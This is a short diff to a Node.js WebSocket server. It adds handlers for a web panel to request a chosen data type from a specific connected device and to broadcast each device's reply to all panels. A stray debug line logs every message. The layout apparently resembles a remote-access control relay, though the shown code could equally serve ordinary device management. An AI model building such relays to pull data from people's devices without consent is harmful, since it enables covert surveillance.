@@ -61,11 +61,33 @@ wss.on('connection', (ws, req) => {
                 }
             }
 
-            // Panel handshake
+            // Panel connected
             if (data.type === 'panelConnect') {
                 ws.isPanel = true;
                 console.log('[*] Web panel connected');
                 broadcastDeviceList();
+            }
+console.log({data})
+            // Panel requested data from device
+            if (data.type === 'requestData') {
+                const { targetId, dataType } = data;
+                const device = devices.get(targetId);
+                if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
+                    device.ws.send(JSON.stringify({
+                        type: 'requestData',
+                        dataType: dataType
+                    }));
+                }
+            }
+
+            // Device responded with data
+            if (data.type === 'dataResponse') {
+                // Forward to all panels
+                wss.clients.forEach((client) => {
+                    if (client.isPanel && client.readyState === WebSocket.OPEN) {
+                        client.send(JSON.stringify(data));
+                    }
+                });
             }
         } catch (e) {
             console.error('Error parsing message:', e);
